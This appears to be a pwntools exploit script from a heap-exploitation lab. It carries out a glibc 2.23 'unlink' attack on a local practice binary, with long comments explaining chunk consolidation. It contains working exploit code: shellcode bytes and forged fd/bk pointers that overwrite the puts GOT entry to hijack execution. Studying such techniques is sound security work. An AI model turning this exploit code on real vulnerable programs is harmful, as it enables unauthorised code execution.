'''
Original Unlink: 
- Uses an altering LibC that edits the 'unlink' macro to remove the protections


Issues: 
- Altering the unlink macro to be a function for debugging is TERRIBLY annoying 
- HEAP is not? possible to make executable. Could alter malloc source code for this? 
- Change the executable to have the proper loader so that we can have symbols :) 
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../../libc_versions/2.23_unlink/libc-2.23.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = '.unlink-2.23_unlink' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env, aslr=False)
	gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23_unlink/
''') 

else: 
	p = process(elf.path, env=env) 


'''
Unlinking
=====================

When two chunks are adjacent and BOTH are free (not including fastbins) 
the chunks are merged together to create a combined chunk. This is done
in order to prevent fragmentation in the heap. This is called 
'consolidation'. 

How is this done in practice? One chunk is already in a 'bin' (doubly linked list). 
So, we must UNLINK (the purpose of this attack) the chunk from the current bin. 
Then, once the chunk has been unlinked, the current chunk and the newly
unlinked chunk are *combined* to make a larger chunk. This can happen 
both from the FORWARD and the BACKWARDS sides. 
Once this is done, the chunk is put into the unsorted bin. 

The macro for the unlinking code looks like the following: 
#define unlink(P, BK, FD) {                                            \
  FD = P->fd;                                                          \
  BK = P->bk;                                                          \
  FD->bk = BK;                                                         \
  BK->fd = FD;                                                         \
}

  a            b            c
______       _______       _____
|  |  | ---> |  |  | -- > |  |  |
|__|__| <--- |__|__| <--- |__|__|
 fd bk        fd bk        fd  bk

The 'FD' is the forward chunk and the 'BK' is the backwards chunk
(think in terms of a doubly linked list). 
The current chunk is essentially just removed by editing the 
two pointers for the different doubly linked lists (bk->fd and fd->bk). 

From the doubly linked list from above, the main goal is to REMOVE 
'b' from the list. This is done by setting a's fd to point to c and 
'c's bk to point to a. 

The idea behind this attack is about controlling the 'FD' and 'BK' pointers. 
If we control those while the unlinking process is happening, then 
we control WHERE to write to :) 


Notes of Caution
==================

All of the things stated above are true in the GENERAL case. However, 
there are some special cases too. 

For consolidation, there are three exceptions to the rule: 
- Tcache/fastbin chunks (although in a bin while free) do not change the 
  prev_inuse bit for speed purposes. So, consolidation does not occur.
- If the chunk adjacent to the top_chunk is freed, then this chunk
  gets absorted into the top_chunk instead of going into the bin.
- The FIRST chunk always has the prev_inuse bit set. 
'''

####################
## Important Values#
####################

winner_func = elf.symbols['winner']
puts_GOT = elf.got['puts']
heap_base = 0x602000 # ASLR is turned off
stack_loc = 0x7fffffffebd0 # May need to change

def shellcode():
	#############
	# Shellcode #
	#############
	'''
	My goal was to jump to shellcode then jump to the winner function. 
	However, the jmp and call instructions are RELATIVE. 
	So, because RET is ABSOLUTE I used this assembly instruction to 
	jump to 'winner'. 

	0:  68 76 07 40 00          push   0x400776
	5:  c3                      ret 
	'''
	#shellcode = "\x90" * 8 # DEBUGGING
	#shellcode += "\xcc"
	print("Creating shellcode!:\npush 0x400776;\nret;\n")
	my_shellcode = "\x68\x56\x07\x40\x00\xc3"
	return my_shellcode

def unlink():
	################
	## Unlink ######
	################ 
	'''

	Heap Layout
	=====================
	The basic description of unlink can be seen above... Review
	this for details on unlink. 

	Here is the layout of the heap, without altering metadata: 

	--- Filler Chunk --
	0x0 prev_size
	0x21 size 
	--- Shellcode Chunk -- 
	0x0 prev_size 
	0x91 size 
	--- Unlink Chunk ---
	0x0 -- prev_size 
	0x91 -- size, with prev_inuse set
	--- Free Victim --- 
	0x0 -- prev_size 
	0x91 -- size, with prev_inuse set
	------------

	Attack 
	====================

	The goal of this attack is to corrupt the 'fd' and 'bk pointers 
	of a unsorted bin chunk in order to trigger the malicious 'unlink'. 

	So, if we ALTER the fd and bk of a chunk, then chunk 
	'free_victim' will attempt to consolidate with chunk 'unlink_chunk'. 
	This consoidation causes an unlink to occur within chunk 'unlink_chunk', 
	where 'unlink_chunk' has corrupted fd and bk pointers. 
	Now, we control all data associated with the unlink itself (in 
	particular, fd and bk). 

	Below, is the example of the exploit (we only control chunk 
	'unlink_chunk' data): 

	--- Chunk 'unlink_chunk' ---
	0x0 -- prev_size 
	0x91 -- size, with prev_inuse set
	fd (corrupted)
	bk (corrupted)
	--- Chunk 'free_victim' --- 
	0x90 -- prev_size. Points to previous chunk
	0x90 -- size <-- prev_inuse bit is not set
	------------


	Arbitrary Write 
	====================

	Now, if we edit the location of 'fd' and 'bk' to be good locations, 
	we have an arbitrary write :) This is because of the macro from before... 
	In particular: 

	  BK + 0x10 = FD
	  FD + 0x18 = BK

	This means that BOTH sections have to be 'writable'. So, we cannot 
	write the address of system to where ever we want, sadly. 


	What To Write 
	====================

	In order to pwn the system, the best thing is to redirect 
	code execution. In this case, because the heap is 
	executable (and writable) we can WRITE to some function pointer 
	to jump there to run shellcode. 

	Two main options: 
		- Without ASLR, we can overwrite a RET address. 
		- Puts GOT entry 

	For the sake of example, we will overwrite the puts GOT entry 
	with heap address. Then, jump to that location :) 

	'''

	print("Creating fake fd and bk pointers")
	print("Point 'fd' to GOT entry and 'bk' to shellcode ")
	''' 
	Setup fd and bk for unlink attack :) 
	Set one to 'puts' GOT entry in order to redirect code execution from 
	the function is called. 

	Set the other to the place to JUMP to (heap) for shellcode. 
	
	NOTE: The fd and bk can be used interchangably for writing; this 
	just chooses one and goes for it. 
	'''
	fake_chunk = p64(puts_GOT - 0x18) # fd: -0x18 is the OFFSET to where we are writing
	fake_chunk += p64(heap_base + 0x30) # bk: WHAT we want to write

	print("Unleash the unlinking!") 
	return fake_chunk

p.sendline(shellcode())
p.sendline(unlink()) # Corrupt chunk to perform unlinking later
p.interactive()
